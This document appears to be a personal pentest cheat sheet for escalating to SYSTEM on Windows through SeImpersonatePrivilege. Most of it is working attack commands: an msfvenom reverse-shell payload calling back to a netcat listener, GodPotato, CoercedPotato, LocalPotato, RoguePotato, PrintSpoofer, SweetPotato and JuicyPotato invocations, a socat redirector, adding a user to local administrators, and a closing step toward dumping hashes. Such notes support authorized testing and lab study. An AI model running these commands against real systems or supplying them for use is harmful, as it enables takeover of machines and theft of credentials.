# Windows privesc: SeImpersonate and potatoes

## Check
whoami /priv
- [ ] SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is listed: Disabled still counts
- [ ] IIS app pools, MSSQL, LOCAL SERVICE and NETWORK SERVICE hold it by default
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
dir C:\Windows\Microsoft.NET\Framework64
- [ ] v4.0.30319 there: GodPotato-NET4.exe; only v2.0.50727: GodPotato-NET35.exe

## A payload
On Kali, then into the target's upload/ folder for serve:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o rev.exe
rlwrap nc -lvnp <LPORT>
- [ ] 32-bit Windows: windows/shell_reverse_tcp instead

## GodPotato
At the pwn-broker prompt:
tool install godpotato
serve
serve files potato
On the target:
cd C:\Users\Public
- [ ] GodPotato-NET4.exe and rev.exe fetched here with the lines serve files gives
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "C:\Users\Public\rev.exe"
- [ ] whoami printed nt authority\system, and the shell came back
- [ ] Nothing printed: GodPotato-NET35.exe, then the tools below
Or an administrator instead of a shell, when I know <Username>'s password:
.\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators <Username> /add"

## The others
JuicyPotato, RoguePotato, LocalPotato and CoercedPotato are in pwn-shop: tool install juicypotato, roguepotato, localpotato or coercedpotato, at the pwn-broker prompt. PrintSpoofer, SharpEfsPotato and SweetPotato are not redistributed: each goes in the target's upload/ folder first. All of them are fetched to C:\Users\Public.
- [ ] Use the 64-bit build on 64-bit Windows

## CoercedPotato
Windows 10, Windows 11 or Server 2022, from LOCAL or NETWORK SERVICE with SeImpersonatePrivilege:
At the pwn-broker prompt:
tool install coercedpotato
serve
serve files potato
On the target:
cd C:\Users\Public
- [ ] CoercedPotato_x64.exe, CoercedPotato_x86.exe and rev.exe fetched here with the lines serve files gives
.\CoercedPotato_x64.exe -c "cmd /c whoami"
.\CoercedPotato_x64.exe -c "C:\Users\Public\rev.exe"
- [ ] Exploit completed printed
- [ ] whoami printed nt authority\system, and the shell came back
- [ ] 32-bit Windows: CoercedPotato_x86.exe instead

## LocalPotato
Windows 10/11 and Server 2016/2019/2022 with the default PrintNotify CLSID. I can start as a non-privileged local or domain user; no SeImpersonatePrivilege needed.
At the pwn-broker prompt:
tool install localpotato
serve
serve files potato
On the target:
cd C:\Users\Public
- [ ] LocalPotato.exe and rev.exe fetched here with the lines serve files gives
HTTP/WebDAV works on updated systems. For a writable WebDAV path on local port 80:
.\LocalPotato.exe -r 127.0.0.1 -u /THE-WEBDAV-PATH
- [ ] File write succeeded printed
The January 2023 patches fixed SMB mode, which also needs a server that does not require SMB signing:
.\LocalPotato.exe -i C:\Users\Public\rev.exe -o Windows\System32\rev.exe
- [ ] SMB Write Request file: Windows\System32\rev.exe success printed
dir C:\Windows\System32\rev.exe
- [ ] The file is there; this is a file write, so I still need to load or run it as SYSTEM

## RoguePotato
For Windows 10 1809 or Server 2019 and later, with SeImpersonatePrivilege. The target must reach port 135 on my machine, where socat sends it back to the resolver RoguePotato runs on the target.
At the pwn-broker prompt:
tool install roguepotato
serve
serve files potato
On Kali, as root for port 135:
sudo socat tcp-listen:135,reuseaddr,fork tcp:<TargetIP>:9999
On the target:
cd C:\Users\Public
- [ ] RoguePotato.exe and rev.exe fetched here with the lines serve files gives
.\RoguePotato.exe -r <LHOST> -e "C:\Users\Public\rev.exe" -l 9999
- [ ] Starting RogueOxidResolver RPC Server listening on port 9999 printed
- [ ] Got SYSTEM Token!!! printed, and the shell came back as nt authority\system
- [ ] The target's firewall blocks 9999: RogueOxidResolver.exe -l 135 on a Windows machine I control, and -r pointed at it with no -l

## PrintSpoofer
Windows 10 and Server 2016 to 2019, with the Print Spooler running:
sc.exe query Spooler
.\PrintSpoofer64.exe -c "C:\Users\Public\rev.exe"
In a shell that keeps a console, such as a reverse shell:
.\PrintSpoofer64.exe -i -c cmd

## SharpEfsPotato
Through the EFS RPC interface, on current Windows:
.\SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a "/c C:\Users\Public\rev.exe"

## SweetPotato
PrintSpoofer's method by default, or another with -e:
.\SweetPotato.exe -p C:\Users\Public\rev.exe
.\SweetPotato.exe -e EfsRpc -p C:\Users\Public\rev.exe

## JuicyPotato, on old Windows
- [ ] Windows 10 1803 or Server 2016 and older: newer builds broke it
.\JuicyPotato.exe -t * -l 1337 -p C:\Users\Public\rev.exe
The default CLSID fails on some builds: one for the exact OS, from the project's CLSID list.
.\JuicyPotato.exe -t * -l 1337 -p C:\Users\Public\rev.exe -c "{THE-CLSID}"

## Afterwards
whoami
- [ ] nt authority\system: dump the hashes next, :Pb windows-creds
